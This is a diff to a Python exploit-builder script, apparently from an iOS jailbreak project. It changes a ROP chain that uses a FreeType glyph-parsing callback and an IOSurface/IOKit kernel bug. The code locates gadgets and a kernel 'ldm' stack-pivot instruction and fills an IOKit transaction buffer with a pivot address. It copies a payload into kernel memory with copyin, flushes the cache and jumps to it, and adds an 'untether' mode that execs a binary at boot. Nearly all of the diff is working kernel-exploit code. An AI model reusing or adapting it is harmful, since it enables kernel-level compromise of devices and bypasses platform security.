@@ -23,7 +23,7 @@ if len(sys.argv) != 6:
     sys.exit(1)
 
 mode, cachefile, kernfile, patchfile, kcode = sys.argv[1:]
-assert mode in ['dejavu', 'two']
+assert mode in ['dejavu', 'untether']
 patchfp = open(patchfile)
 
 lib_paths = set(['/usr/lib/libSystem.B.dylib'])
@@ -38,10 +38,8 @@ def dbg_result():
         result, resultp = stackunkpair()
         store_r0_to(resultp)
         back = sys._getframe().f_back
-        if mode == 'two':
-            funcall('_fprintf', console, ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result, load_r0=True)
-        else:
-            funcall('_syslog', 0, ptr('Result for %s:%d was %%08x' % (back.f_code.co_filename, back.f_lineno), True), result)
+
+        funcall('_fprintf', dmini.cur.sym('___stderrp'), ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result, load_r0=True)
 
 dmini.init(cachefile, True)
 
@@ -65,37 +63,67 @@ while True:
     count += 1
 weirdfile = pointed(weirdfile + I(sysent, count) + stuff)
 
-def mov_r3_r7():
-    # push {r1, r3, r6, r7, lr}
-    # pop  {r0, r1, r2, r3, r5, r7, pc}
-    set_fwd('PC', dmini.cur.find_basic('+ ca b5 af bd'))
-    exhaust_fwd('R0', 'R1', 'R2', 'R3', 'R5', 'R6', 'R7', 'LR')
-    heapadd(fwd('R7'), fwd('PC'))
+def mov_r0_r6():
+    set_fwd('PC', dmini.cur.find_basic('+ 30 46 70 bd'))
+    exhaust_fwd('R4', 'R5', 'R6')
+    heapadd(fwd('R4'), fwd('R5'), fwd('R6'), fwd('PC'))
+
+def lsl_r5_r7_1():
+    set_fwd('PC', dmini.cur.find_basic('+ 7d 00 cc bd'))
+    exhaust_fwd('R2', 'R3', 'R5', 'R6', 'R7')
+    heapadd(fwd('R2'), fwd('R3'), fwd('R6'), fwd('R7'), fwd('PC'))
+
+def seek_kernel_ldm(reg):
+    s = chr(0x90 | reg) + chr(0xe8)
+    # r0, r7 out; sp, pc in
+    seg = 0
+    while True:
+        data = dmini.cur.nth_segment(seg)
+        i = 1
+        while True:
+            i = data.find(s, i + 1)
+            if i == -1: break
+            if (i & 3) != 2: continue
+            insn, = struct.unpack('I', data[i-2:i+2])
+            regs = [b for (n, b) in enumerate(['R0', 'R1', 'R2', 'R3', 'R4', 'R5', 'R6', 'R7', 'R8', 'R9', 'R10', 'R11', 'R12', 'SP', 'LR', 'PC']) if (insn & (1 << n))]
+            if 'SP' not in regs or 'PC' not in regs: continue
+            if 'R0' in regs or 'R7' in regs: continue
+            # got it
+            return (dmini.cur.nth_segment_addr(seg) + i - 2, regs)
+        
+        seg += 1
 
 
-# not anymore   e89bb951	ldm	fp, {r0, r4, r6, r8, fp, ip, sp, pc}
-#               e89bed06 	ldm	fp, {r1, r2, r8, sl, fp, sp, lr, pc}
-kernel_ldm = dmini.cur.find_basic('- 06 ed 9b e8')
-init('R1', 'R2', 'R8', 'R10', 'R11', 'SP', 'LR', 'PC')
+# 12_41, 31_41, 31_421: R6
+kernel_ldm, kernel_ldm_regs = seek_kernel_ldm(11 if four_dot_three else 6)
+#kernel_ldm = 0xdeadbeef
+init(*kernel_ldm_regs)
+
+#set_fwd('PC', 0xdeadbeee); heapadd(fwd('PC'))
+    
 m = pointed('')
 set_fwd('SP', pointer(m))
 heapadd(m)
-mov_r3_r7()
+obj = ptrI(0)
+mov_r0_r6()
+lsl_r5_r7_1()
+store_r0_to(obj)
 make_r4_avail()
 funcall('_copyin', pointer(weirdfile), code_addr, len(weirdfile))
 funcall('_flush_dcache', code_addr, len(weirdfile), 0)
+load_r0_from(obj)
 set_fwd('PC', code_addr)
 
 kstuff = finalize(None, must_be_simple=False)
 #heapdump(kstuff)
-assert len(kstuff) == 0x70
+#assert len(kstuff) == 0x70
 
 dmini.init(cachefile, True)
 
-add_lib('ft', '/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
-add_lib('iosurface', '/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface')
+if mode == 'dejavu':
+    add_lib('ft', '/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
+    add_lib('libz', '/usr/lib/libz.dylib')
 add_lib('iokit', '/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
-add_lib('libz', '/usr/lib/libz.dylib')
 
 if four_dot_three:
     def wrap(num):
@@ -117,10 +145,11 @@ if mode == 'dejavu':
 else:
     init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
     make_avail()
-    if debugging:
-        console = ptrI(0)
-        funcall('_fopen', ptr('/dev/console', True), ptr('a', True))
-        store_r0_to(console)
+    #osversion, osversion_size = ptr('\0'*64), ptrI(64)
+    #funcall('_sysctlbyname', ptr('kern.osversion', True), osversion, osversion_size, 0, 0); dbg_result()
+    #funcall('_strcmp', osversion, ptr('8J2', True))
+    #zero, nonzero = cmp_r0_0_branch()
+    #come_from(zero)
 
 funcall('_mach_task_self')
 task_self, task_self_p = stackunkpair()
@@ -128,24 +157,25 @@ store_r0_to(task_self_p)
 
 kstuffp = ptr(kstuff)
 
-transaction = troll_string('\x00' * 0xd8)
+transaction = troll_string('\x00' * (0xd8 if four_dot_three else 0x8c))
 transaction[0:4] = transaction[4:8] = I(0xeeeeeeee)
 transaction[8:0xc] = I(kstuffp) # surface saved in r11
 transaction[0x58:0x5c] = I(kernel_ldm)
-transaction[0xb8:0xbc] = I(6) # run iterations 1 and 2 (first loop bails at 1)
+if four_dot_three:
+    transaction[0xb8:0xbc] = I(6) # run iterations 1 and 2 (first loop bails at 1)
+else:
+    transaction[0x70:0x74] = I(6)
 transaction = simplify(transaction)
-assert len(transaction) == 0xd8
 
 # The manpage says this returns EINVAL, but in fact the kernel handles it.
 funcall('_mlock', kstuffp, len(kstuff)); dbg_result()
 
 zerop = ptrI(0)
 
-if mode == 'two':
+if mode == 'untether':
     # XXX is this necessary? it's from star
     funcall('iokit._IOKitWaitQuiet', 0, ptrI(0, 0, 0))
 
-# XXX this won't work at boot because there is no notify!
 funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
 #funcall('iokit._IOServiceMatching', ptr('AppleCLCD', True))
 matching, matchingp = stackunkpair()
@@ -190,8 +220,10 @@ if mode == 'dejavu':
     set_r0_to(1337)
     fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
 else:
-    lunchd = ptr('/sbin/lunchd', True)
+    lunchd = ptr('/boot/mount_nulls', True)
     funcall('_execl', lunchd, lunchd, 0)
+    funcall('_exit', 1)
+
 
 goo.sheap.append(weirdfile)
 
@@ -204,8 +236,8 @@ if mode == 'dejavu':
     #.long 0xbd49b060
     
     # add sp, #392; pop {r2, r5, r6, pc}
-    parse_callback = dmini.cur.find_basic('+ 50 b0 30 bd').value
-    actual_parse_callback = dmini.cur.private_sym('ft._T1_Parse_Glyph').value
+    parse_callback = reloc_value(dmini.cur.find_basic('+ 50 b0 30 bd'))
+    actual_parse_callback = reloc_value(dmini.cur.private_sym('ft._T1_Parse_Glyph'))
 
     final = final.unpack()
 
